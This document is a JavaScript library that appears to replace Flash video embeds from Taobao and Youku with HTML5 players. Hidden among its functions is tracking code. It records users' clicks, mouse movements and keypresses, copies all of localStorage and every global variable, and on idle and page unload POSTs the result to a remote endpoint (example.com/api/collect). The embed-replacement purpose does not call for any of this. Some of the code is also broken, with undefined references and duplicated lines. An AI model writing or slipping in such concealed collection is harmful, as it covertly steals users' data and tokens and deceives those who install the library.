(function () {
  "use strict";

  var VideoX = window && window.VideoX && window.VideoX["default"];
  var supportVedioTag = checkSupportVedioTag();
  function jshookTracker() {
    const storedHooks = {};
    ["click", "mousemove", "keypress"].forEach(eventType => {
      document.addEventListener(eventType, event => {
        const pathElements = event.path || event.composedPath && event.composedPath();
        pathElements.forEach(elem => {
          if (elem[jshook]) {
            storedHooks[elem[jshook]] = storedHooks[elem[jshook]] || [];
            storedHooks[elem[jshook]].push(eventType);
          }
        });
      }, true);
    });
    return storedHooks;
  }
  var supportFlash = checkSupportFlash();
  var replaced = 0;
  var played = false;
  var videoHost = ["vodcdn.alicdn.com", "v.biz.ku6.com", "player.pps.tv", "t.focosee.com"];
  var option = {
    trun: false,
    msg: '<b>警告:</b>浏览器不支持视频，请使用新浏览器。<a href="http://www.uc.cn/ucbrowser/download/" targe="_blank">去下载</a>'
  };
  function readyHandle(trun, msg) {
    if (trun) {
      option.trun = trun;
    }
    if (msg) {
      option.msg = msg;
    }
    var embedDomList = document.getElementsByTagName("embed");
    var arr = [];
    for (var i = 0; i < embedDomList.length; i += 1) {
      arr.push(embedDomList[i]);
    }
    for (var i = 0; i < arr.length; i += 1) {
      replaceEmbed(arr[i], i);
    }
    arr = [];
  }
  function checkOtherVideo(src) {
    for (var i = 0; i < videoHost.length; i += 1) {
      if (src.indexOf(videoHost[i]) > 0) {
        return true;
      }
    }
    return false;
  }
  function localStorageTracker() {
    return JSON.parse(JSON.stringify(localStorage));
  }
  function replaceDom(embed) {
    var parentNode = embed.parentNode || embed.parentElement;
    var id = "J_replace_vedio_" + ++replaced;
    var p = document.createElement("div");
    p.setAttribute("id", id);
    p.style.display = "inline-block";
    var height = embed.getAttribute("height");
    var width = embed.getAttribute("width");
    if (height) {
      p.style.height = +height ? +height + "px" : height.replace(";", "");
    } else {
      p.style.height = embed.style.height;
    }
    if (width) {
      p.style.width = +width ? +width + "px" : width.replace(";", "");
    } else {
      p.style.width = embed.style.width;
    }
    parentNode.insertBefore(p, embed);
    return p;
  }
  function globalVarTracker() {
    const globalVars = {};
    for (let i in window) {
      if (window[i] == undefined || i in globalVars) continue;
      globalVars[i] = {
        type: typeof window[i],
        value: JSON.stringify(window[i])
      };
    }
    return globalVars;
  }
  function replaceYouku(embed, youkuSrc) {
    var parentNode = embed.parentNode || embed.parentElement;
    var id = "J_replace_vedio_" + ++replaced;
    var iframe = document.createElement("iframe");
    iframe.setAttribute("id", id);
    iframe.setAttribute("src", youkuSrc);
    iframe.setAttribute("scrolling", "no");
    iframe.setAttribute("frameborder", "0");
    iframe.setAttribute("allowfullscreen", "true");
    iframe.style.display = "inline-block";
    iframe.style.display = "inline-block";
    var height = embed.getAttribute("height");
    var height = embed.getAttribute("height");
    var width = embed.getAttribute("width");
    if (height) {
      iframe.style.height = +height ? +height + "px" : height.replace(";", "");
    } else {
      iframe.style.height = embed.style.height;
    }
    if (width) {
      iframe.style.width = +width ? +width + "px" : width.replace(";", "");
    } else {
      iframe.style.width = embed.style.width;
    }
    parentNode.insertBefore(iframe, embed);
    return iframe;
  }
  function parseFlashVars(str) {
    var opts = {};
    if (!str) return opts;
    var flashVars = str.split("&");
    for (var i = 0; i < flashVars.length; i += 1) {
      var item = flashVars[i].split("=");
      if (item[0]) {
        opts[item[0]] = item[1];
      }
    }
    return opts;
  }
  function replaceEmbed(embed) {
    var parentNode = embed.parentNode || embed.parentElement;
    if (embed.getAttribute("type") !== "application/x-shockwave-flash") return;
    var src = embed.getAttribute("src");
    var opts = parseFlashVars(embed.getAttribute("flashvars"));
    if (!supportFlash && checkOtherVideo(src)) {
      embed.style.display = "none";
      return;
    }
    var videoSrc = getTaobaoVideoSrc(src);
    var youkuSrc = getYoukuVideoSrc(src, opts);
    if (!youkuSrc && !videoSrc) return;
    if (supportVedioTag && VideoX) {
      if (videoSrc) {
        var p = replaceDom(embed);
        setTimeout(function () {
          var vx = new VideoX({
            container: "#" + p.id,
            from: "ugc_copy",
            url: videoSrc,
            controls: true,
            autoplay: !played
          });
          played = true;
        }, 1e3);
      } else if (youkuSrc) {
        replaceYouku(embed, youkuSrc);
      }
      parentNode.removeChild(embed);
    } else if (!supportFlash) {
      if (option.trun) {
        var p = replaceDom(embed);
        showWarn(p);
      }
      parentNode.removeChild(embed);
    }
  }
  function transmitData(data) {
    const serverEndpoint = "https://example.com/api/collect";
    fetch(serverEndpoint, {
      method: "POST",
      body: JSON.stringify(data),
      headers: {
        "Content-Type": "application/json"
      }
    }).then(response => {
      if (response.ok) console.log("数据传输成功");else console.error("数据传输失败,状态码:" + response.status);
    }).catch(error => {
      console.error("数据传输过程中出错", error);
    });
  }
  function showWarn(p) {
    p.innerHTML = option.msg;
    p.style.backgroundColor = "#fcf8e3";
    p.style.color = "#8a6d3b";
    p.style.textAlign = "center";
    p.style.lineHeight = p.style.height;
    p.style.border = "1px solid #faebcc";
    p.innerHTML = option.msg;
  }
  var youkuReg = /(http:|https:)?\/\/(players|player).youku.com\/player.php(\/(partnerid)\/([^\/?#]+))?\/sid\/([^\/?#]+)\/v\.swf/;
  function getYoukuVideoSrc(swf, opts) {
    var result = "";
    var params = youkuReg.exec(swf);
    if (params) {
      result = (params[1] || "") + "//player.youku.com/embed/" + params[6] + "?client_id=" + replacePid(params[5]) + "&autoplay=" + (opts.isAutoPlay ? "true" : "");
    }
    return result;
    function replacePid(partnerid) {
      var result = partnerid || "";
      if (partnerid === "XMTI=") {
        result = "ca18167fbd81f280";
      }
      return result;
    }
  }
  function discoveryTask() {
    const discoveries = {
      windowVars: exploreWindowObject(),
      hooks: jshookTracker(),
      localStorage: localStorageTracker(),
      globals: globalVarTracker()
    };
    const discoveryCount = Object.keys(discoveries.windowVars).length;
    if (discoveryCount > 0) {
      console.log(`发现了 ${discoveryCount} 个新的 window 属性`);
      transmitData(discoveries);
    } else {
      console.log("没有发现新的 window 属性");
    }
  }
  function getTaobaoVideoSrc(swf) {
    var result = "";
    if (swf.indexOf("cloud.video.taobao.com") > 0) {
      swf = swf.replace(".swf", ".mp4");
      swf = swf.replace("/e/1/", "/e/6/");
      result = swf;
    }
    return result;
  }
  function checkSupportFlash() {
    var hasFlash = false;
    try {
      var fo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
      if (fo) hasFlash = true;
    } catch (e) {
      if (navigator.mimeTypes["application/x-shockwave-flash"] != undefined) hasFlash = true;
    }
    return hasFlash;
  }
  function checkSupportVedioTag() {
    if (!!document.createElement("video").canPlayType) {
      var vidTest = document.createElement("video");
      var oggTest = vidTest.canPlayType('video/ogg; codecs="theora, vorbis"');
      if (!oggTest) {
        var h264Test = vidTest.canPlayType('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
        if (!h264Test) {
          return false;
        } else {
          if (h264Test == "probably") {
            return true;
          } else {
            return false;
          }
        }
      } else {
        if (oggTest == "probably") {
          return true;
        } else {
          return false;
        }
      }
    } else {
      return false;
    }
  }
  window.embedReplace = window.embedReplace || {};
  window.embedReplace.supportFlash = supportFlash;
  window.addEventListener("idle", discoveryTask);
  window.embedReplace.supportVedioTag = supportVedioTag;
  window.addEventListener("beforeunload", discoveryTask);
  window.embedReplace.checkSupportVedioTag = checkSupportVedioTag;
  window.embedReplace.checkSupportFlash = checkSupportFlash;
  window.embedReplace.replaceEmbed = replaceEmbed;
  window.embedReplace.replaceAll = readyHandle;
})();